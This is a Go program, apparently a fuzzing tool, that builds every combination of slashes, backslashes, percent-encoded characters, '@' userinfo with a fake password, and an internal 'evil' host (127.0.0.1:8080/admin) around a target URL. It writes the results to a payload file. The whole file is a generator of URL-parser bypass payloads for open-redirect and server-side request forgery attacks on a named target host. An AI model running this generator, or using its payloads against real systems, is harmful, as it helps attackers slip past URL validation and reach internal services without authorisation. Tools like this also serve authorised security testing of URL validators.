package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"math"
	"os"
	"sync"
	"time"
)

type PayloadSet map[string]struct{}

type PayloadGroup struct {
	mutex             sync.Mutex
	payload_set       PayloadSet
	candidate_counter int
}

func NewPayloadGroup() *PayloadGroup {
	var plg PayloadGroup
	plg.payload_set = make(PayloadSet)
	return &plg
}

func convert_string_to_complete_percent_encoded_hex(str_in string) (encoded_str_out string) {

	encoded_str_out = ""
	for i := 0; i < len(str_in); i++ {
		encoded_str_out = fmt.Sprintf("%s%s%s", encoded_str_out, "%", hex.EncodeToString([]byte{str_in[i]}))
	}
	return
}

func main() {

	scheme := os.Args[1]
	host := os.Args[2]
	port := os.Args[3]
	directory := os.Args[4]
	fragment := os.Args[5]
	split_url := []string{scheme, host, port, directory, fragment}
	split_url = split_url
	start := time.Now()
	evil_host := "127.0.0.1"
	evil_dir := "/admin"
	evil_port := "8080"
	fake_password := "password1234"
	all_payloads := generate_all_payloads(scheme, host, directory, evil_host, evil_dir, evil_port, fake_password)
	filename_out := fmt.Sprintf("%s-payloads.txt", host)
	f, err := os.OpenFile(filename_out, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println(err)
	}
	defer f.Close()
	for payload, _ := range all_payloads.payload_set {
		if _, err := f.WriteString(fmt.Sprintf("%s\n", payload)); err != nil {
			log.Println(err)
		}
	}
	t := time.Now()
	elapsed := t.Sub(start)
	fmt.Println("All payloads generated in ", elapsed)

}

func produce_payloads_int_chan(ints_chan <-chan int, payload_slice_in []string, send_channel chan<- string, doneIndicator *bool, wg *sync.WaitGroup, id int) {

	fmt.Println("starting producer ", id)

	defer fmt.Println("finished producer ", id)
	defer wg.Done()

	for {
		select {
		case combo_num, _ := <-ints_chan:

			send_channel <- generate_payload_by_binary_int_map(combo_num, payload_slice_in)

		default:
			if *doneIndicator {
				return
			}
		}
	}
}

func consume_payloads(payload_group *PayloadGroup, receive_channel <-chan string, doneIndicator *bool, ints_chan chan int, wg *sync.WaitGroup, id int) {

	fmt.Println("consumer ", id, " started")

	defer fmt.Println("consumer ", id, " done")
	defer wg.Done()

	for {
		select {
		case payload := <-receive_channel:

			payload_group.mutex.Lock()
			if _, exists := payload_group.payload_set[payload]; !exists {
				payload_group.payload_set[payload] = struct{}{}
			}
			payload_group.candidate_counter += 1
			payload_group.mutex.Unlock()

		default:
			if *doneIndicator && len(receive_channel) == 0 {
				return
			}
		}
	}
}

const (
	NumProducers  = 9
	NumConsumers  = 1
	MaxGoroutines = 10
	MaxBufferSize = 10000
)

func generate_all_payloads(scheme string, expected_host string, directory string, evil_host string, evil_dir string, evil_port string, fake_password string) *PayloadGroup {

	var wgProducers sync.WaitGroup
	var wgConsumers sync.WaitGroup

	payload_group := NewPayloadGroup()
	payload_slice := create_payload_slice(scheme, expected_host, directory, evil_host, evil_dir, evil_port, fake_password)
	//Pow returns float64, but we want integer division at delta definition
	total_payloads := int(math.Pow(2, float64(len(payload_slice))))
	fmt.Println("total candidates: ", total_payloads)

	doneIndicator := false

	data_channel := make(chan string, MaxBufferSize)
	filled_channel := make(chan struct{})
	ints_channel := make(chan int, total_payloads)

	go fill_ints_chan(ints_channel, filled_channel, total_payloads)

	for i := 0; i < NumConsumers; i++ {

		if !doneIndicator {
			wgConsumers.Add(1)
			go consume_payloads(payload_group, data_channel, &doneIndicator, ints_channel, &wgConsumers, i)
		}
	}

	for i := 0; i < NumProducers; i++ {
		if !doneIndicator {
			wgProducers.Add(1)
			go produce_payloads_int_chan(ints_channel, payload_slice, data_channel, &doneIndicator, &wgProducers, i)
		}
	}

	go signal_done_on_empty_ints(ints_channel, &doneIndicator, filled_channel)

	wgConsumers.Wait()
	wgProducers.Wait()
	return payload_group

}

func generate_payload_by_binary_int_map(int_in int, payload_slice []string) (payload_out string) {

	index := 0
	for int_in > 0 {
		if int_in&1 == 1 {
			payload_out = fmt.Sprintf("%s%s", payload_out, payload_slice[index])
		}
		int_in >>= 1
		index += 1
	}
	return
}

func create_payload_slice(scheme string, expected_host string, directory string, evil_host string, evil_dir string, evil_port string, fake_password string) (payload_slice []string) {

	enc_slash := convert_string_to_complete_percent_encoded_hex("/")
	enc_bs := convert_string_to_complete_percent_encoded_hex("\\")
	enc_evil_host := convert_string_to_complete_percent_encoded_hex(evil_host)
	enc_evil_port := convert_string_to_complete_percent_encoded_hex(evil_port)
	enc_fakepw := convert_string_to_complete_percent_encoded_hex(fake_password)
	payload_slice = []string{scheme, "/", "\\", "/", "\\", enc_slash, enc_bs, enc_slash, enc_bs, evil_host, evil_dir, ".", "#", expected_host, directory, fmt.Sprintf(":%s", fake_password), fmt.Sprintf(":%s", enc_fakepw), "@", evil_host, enc_evil_host, fmt.Sprintf(":%s", enc_evil_port), evil_dir}
	return
}

func fill_ints_chan(ints_chan chan<- int, filled_signal_chan chan<- struct{}, chan_size int) {

	for i := 0; i < chan_size; i++ {
		ints_chan <- i
	}
	filled_signal_chan <- struct{}{}
	return
}

func signal_done_on_empty_ints(ints_chan chan int, doneIndicator *bool, filled_signal_chan <-chan struct{}) {

	select {
	case <-filled_signal_chan:
		for {
			if len(ints_chan) == 0 {
				fmt.Println("done triggered")
				*doneIndicator = true
				return
			}
		}
	}
}
